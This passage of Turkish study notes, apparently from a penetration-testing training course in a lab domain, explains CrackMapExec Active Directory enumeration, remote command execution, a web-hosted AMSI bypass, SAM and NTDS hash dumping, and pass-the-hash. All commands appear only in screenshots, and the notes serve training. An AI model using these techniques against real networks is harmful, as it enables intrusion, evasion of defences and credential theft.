+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
